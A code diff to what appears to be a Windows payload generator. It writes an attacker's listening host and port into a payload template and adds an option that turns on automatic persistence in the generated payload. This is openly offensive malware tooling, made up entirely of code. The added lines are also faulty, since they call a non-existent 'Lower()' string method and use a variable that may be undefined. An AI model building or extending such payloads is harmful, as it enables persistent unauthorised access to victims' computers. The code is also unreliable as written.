@@ -18,6 +18,8 @@ def generate(data=''):
                 host = (attr.replace('lhost ', '')).replace(' ', '')
             elif 'lport ' in attr:
                 port = int(attr.replace('lport ', '').replace(' ', ''))
+            elif 'persis ' in attr:
+                persis = str(attr.replace('persis ', '').replace(' ', ''))
             elif 'outfile ' in attr:
                 path = P.abspath(attr.replace('outfile ', '')).replace(' ', '')
                 name = P.basename(path)
@@ -45,10 +47,14 @@ def generate(data=''):
             for line in fileinput.input(r'sources/templates/win.py', inplace=True):
                 l1 = "host = ip"
                 l2 = "port = prt"
+                l3 = "auto_persis = False"
                 if l1 in line:
                     line = line.replace(l1, f"host = '{host}'")
                 if l2 in line:
                     line = line.replace(l2, f"port = {port}")
+                if l3 in line:
+                    if persis.Lower() == "auto":
+                        line = line.replace(l3, "auto_persis = True")
                 sys.stdout.write(line)
             subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
             print(f"Windows Payload generated and saved as '{path}'")
